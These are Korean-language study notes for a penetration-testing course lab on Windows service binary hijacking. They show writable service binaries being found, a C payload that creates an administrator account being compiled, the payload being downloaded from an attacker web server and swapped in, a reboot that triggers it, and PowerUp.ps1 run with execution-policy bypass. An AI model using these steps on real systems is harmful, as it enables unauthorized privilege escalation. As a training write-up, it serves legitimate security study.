# 17.2.1 서비스 실행 파일 하이재킹

> **Service Binary Hijacking** · PEN-200 §17.2.1

서비스마다 연결된 실행 파일이 있고, 서비스가 시작되거나 실행 상태로 전이할 때 그 파일이 실행됨. 여기에 성립하는 공격이 실행 파일 하이재킹임 — 개발자가 설치 과정에서 권한을 조이지 않아 `Users` 그룹에 읽기·쓰기가 전부 열려 있으면, 낮은 권한 사용자가 그 파일을 악성 실행 파일로 **교체**할 수 있음. 이후 서비스가 다시 시작되면 교체본이 서비스 계정(예: LocalSystem) 권한으로 실행됨.

성립 전제가 세 개이고, 하나라도 빠지면 못 씀:

1. 서비스 실행 파일에 **쓰기 권한**이 있을 것
2. 서비스를 **다시 돌릴 수단**이 있을 것 — 서비스 중지·시작 권한이 있거나, 시작 유형이 `Auto` 이고 재부팅을 걸 수 있을 것
3. 그 서비스가 **현재보다 높은 권한**으로 돌 것

이 절의 예시는 `dave` / 비밀번호 `lab` 으로 CLIENTWK220 에 **RDP** 로 접속해 진행함. 서비스 목록은 GUI 스냅인 `services.msc`, `Get-Service`, `Get-CimInstance`(`Get-WmiObject` 의 후계) 중 아무거나로 얻을 수 있음.

⚠️ **로그온 방식이 결과를 가름.** WinRM 이나 바인드 셸 같은 **네트워크 로그온**에서는 비관리자 사용자로 `Get-CimInstance`·`Get-Service` 를 돌리면 "permission denied" 가 남. RDP 같은 **대화형 로그온**이면 해결됨.

WMI 클래스 `win32_service` 를 질의하고 이름·상태·바이너리 경로만 뽑은 뒤, `Where-Object` 로 실행 중인 것만 남김.

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select
Name,State,PathName | Where-Object {$_.State -like 'Running'}
Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k
LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k
LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k
LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-
file=c:\xampp\mysql\bin\my.ini mysql
...
```

⚠️ 위 블록에서 명령이 `Select` 뒤로 접히고 `--defaults-file=` 이 두 줄로 갈라진 것은 교재 PDF 자체가 지면 폭에 맞춰 접어 인쇄한 것임 — 원래는 각각 한 줄이고, 그대로 복사해 치면 실패함.

**판정 기준은 경로임.** `C:\Windows\System32` 밖, 여기서는 `C:\xampp\` 에 있는 `Apache2.4` 와 `mysql` 이 눈에 띔. 그 위치는 사용자가 설치한 소프트웨어이고 디렉터리 구조와 권한을 개발자가 정했다는 뜻이라, 하이재킹에 노출됐을 가능성이 높음.

다음은 두 실행 파일의 권한 확인. `icacls`(전통적 유틸리티)나 PowerShell 의 `Get-ACL` 을 씀. 여기서는 PowerShell 과 cmd 양쪽에서 쓸 수 있는 `icacls` 를 씀. 출력은 주체와 권한 마스크 쌍임.

| 마스크 | 권한 |
|---|---|
| `F` | Full access |
| `M` | Modify access |
| `RX` | Read and execute access |
| `R` | Read-only access |
| `W` | Write-only access |

```
PS C:\Users\dave> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)
Successfully processed 1 files; Failed processing 0 files
```

`dave` 는 `Users` 멤버라 `httpd.exe` 에는 `RX` 뿐 — 교체 불가.

```
PS C:\Users\dave> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)
Successfully processed 1 files; Failed processing 0 files
```

`mysqld.exe` 는 `BUILTIN\Users:(F)` — 쓰기·수정이 되므로 교체 가능. 앞에 상속 표시 `(I)` 가 없다는 점이 중요함: **상속이 아니라 일부러 준 권한**임. 관리자가 서비스 구성 시 필요한 권한을 확신하지 못해 Full 로 열어두는 관행에서 나오는 전형적 오설정임.

교체할 바이너리는 Kali 에서 만듦. `system` 함수로 로컬 사용자 `dave2` 를 만들고 Administrators 그룹에 넣는 C 코드를 `adduser.c` 로 저장함.

```
#include <stdlib.h>
int main ()
{
  int i;
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  return 0;
}
```

대상이 64비트이므로 `mingw-64` 로 64비트 크로스 컴파일함.

```
kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

Kali 에서 결과물 디렉터리에 웹 서버를 띄우고, 대상에서 `iwr` 로 받아 교체함. **원본은 지우지 말고 홈으로 옮겨둘 것** — 권한 상승 후 서비스를 원상 복구하려면 필요함.

```
PS C:\Users\dave> iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
PS C:\Users\dave> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
PS C:\Users\dave> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

이제 전제 ②(다시 돌릴 수단)로 감. 먼저 서비스 중지를 시도함.

```
PS C:\Users\dave> net stop mysql
System error 5 has occurred.
Access is denied.
```

거부됨. 서비스 관리는 보통 관리자만 가능하므로 **예상된 결과**임. 그러면 남은 길은 재부팅이고, 그것이 통하려면 시작 유형이 `Automatic` 이어야 함.

```
PS C:\Users\dave> Get-CimInstance -ClassName win32_service | Select Name, StartMode |
Where-Object {$_.Name -like 'mysql'}
Name  StartMode
----  ---------
mysql Auto
```

`Auto` 이므로 재부팅하면 자동으로 뜸. 재부팅을 걸려면 사용자에게 `SeShutDownPrivilege` 가 있어야 하므로 `whoami /priv` 로 확인함.

```
PS C:\Users\dave> whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

⚠️ **`Disabled` 를 "없음"으로 읽지 말 것.** 그 상태는 «현재 실행 중인 프로세스가 해당 권한(privilege)을 요청해 사용 중인가»만 나타냄 — 여기서는 `whoami` 가 `SeShutdownPrivilege` 를 쓰고 있지 않다는 뜻일 뿐, 권한 자체는 보유하고 있음. 반대로 이 권한이 아예 목록에 없었다면 피해자가 서비스를 수동으로 시작할 때까지 기다려야 해 훨씬 불리해짐.

⚠️ 실무에서는 운영 시스템 재부팅을 최대한 피할 것. 부팅에 실패하면 고객 업무가 멈추고 장기 다운타임까지 갈 수 있으며 최신 백업이 없으면 특히 그러함. 반드시 고객 IT 와 직접 협의한 뒤에만 걸 것.

```
PS C:\Users\dave> shutdown /r /t 0
```

재부팅 후 다시 `dave` 로 RDP 접속해 결과를 확인함.

```
PS C:\Users\dave> Get-LocalGroupMember administrators
ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```

`dave2` 가 생성돼 Administrators 에 들어감. 이후 `RunAs` 로 대화형 셸을 얻거나, `msfvenom` 으로 리버스셸 실행 파일을 만들어 같은 방식으로 심을 수도 있음. 원상 복구는 심어둔 `mysqld.exe` 삭제 → 백업해둔 원본 복원 → **시스템 재부팅** 순서임.

같은 벡터를 자동 도구로도 검사해봄. `PowerUp.ps1` 을 Kali 에서 서빙함.

```
kali@kali:~$ cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
kali@kali:~$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ..
```

대상에서 `iwr` 로 받고, 스크립트 실행이 막히지 않도록 `powershell -ep bypass` 로 띄운 뒤 점 소싱으로 임포트함. `Get-ModifiableServiceFile` 이 현재 사용자가 수정 가능한 서비스 파일·설정 파일을 나열함.

```
PS C:\Users\dave> iwr -uri http://192.168.48.3/PowerUp.ps1 -Outfile PowerUp.ps1
PS C:\Users\dave> powershell -ep bypass
...
PS C:\Users\dave>  . .\PowerUp.ps1
PS C:\Users\dave> Get-ModifiableServiceFile
...
ServiceName                     : mysql
Path                            : C:\xampp\mysql\bin\mysqld.exe --defaults-
file=c:\xampp\mysql\bin\my.ini mysql
ModifiableFile                  : C:\xampp\mysql\bin\mysqld.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes,
Synchronize...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'mysql'
CanRestart                      : False
```

탐지는 정확함 — 파일 경로, 주체(`BUILTIN\Users`), 서비스 계정(`LocalSystem`), 재시작 가능 여부(`False`)까지 짚음. `AbuseFunction` 은 바이너리 교체를 자동화하는 내장 함수로, 기본 동작은 로컬 사용자 `john` / `Password123!` 를 만들어 Administrators 에 넣는 것임. 그런데 실제로 부르면 실패함.

```
PS C:\Users\dave> Install-ServiceBinary -Name 'mysql'
Service binary 'C:\xampp\mysql\bin\mysqld.exe --defaults-
file=c:\xampp\mysql\bin\my.ini mysql' for service mysql not
modifiable by the current user.
At C:\Users\dave\PowerUp.ps1:2178 char:13
+             throw "Service binary '$($ServiceDetails.PathName)' for s ...
+             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OperationStopped: (Service binary ...e current
user.:String) [], RuntimeException
    + FullyQualifiedErrorId : Service binary 'C:\xampp\mysql\bin\mysqld.exe --
defaults-file=c:\xampp\mysql\bin\my.ini
   mysql' for service mysql not modifiable by the current user.
```

"수정할 수 없다"는 판정인데 우리는 이미 Full Access 를 확인했고 손으로 교체까지 해봤음 — **도구가 틀린 것**임. 원인은 내부에서 쓰는 `Get-ModifiablePath` 임. 세 가지 입력을 직접 넣어 동작을 갈라 봄.

```
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe' | Get-
ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
ModifiablePath                IdentityReference Permissions
--------------                ----------------- -----------
C:\xampp\mysql\bin\mysqld.exe BUILTIN\Users     {WriteOwner, Delete, WriteAttributes,
Synchronize...}
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument' |
Get-ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
ModifiablePath     IdentityReference                Permissions
--------------     -----------------                -----------
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, WriteAttributes,
Synchronize, ReadControl...}
C:\xampp\mysql\bin NT AUTHORITY\Authenticated Users {Delete, GenericWrite,
GenericExecute, GenericRead}
PS C:\Users\dave> $ModifiableFiles = echo 'C:\xampp\mysql\bin\mysqld.exe argument -
conf=C:\test\path' | Get-ModifiablePath -Literal
PS C:\Users\dave> $ModifiableFiles
```
*경로만·평범한 인자 하나까지는 결과가 나오지만, 인자 안에 경로가 든 세 번째는 빈 결과임*

실행 파일 경로만 넘기거나 평범한 인자가 하나 붙은 경우는 정상 동작하지만, **인자 안에 경로가 들어 있으면 빈 결과를 반환함.** `mysql` 의 서비스 경로에는 `--defaults-file=c:\xampp\mysql\bin\my.ini` 가 붙어 있어 여기에 걸림.

교훈은 둘로 갈림 — 탐지 결과는 쓸 만하니 `PowerUp` 으로 후보를 빠르게 뽑되, `AbuseFunction` 이 실패한다고 해서 "취약하지 않다"로 닫지 말 것. 그때는 이 절에서 한 대로 수동 익스플로잇으로 확인해야 함.
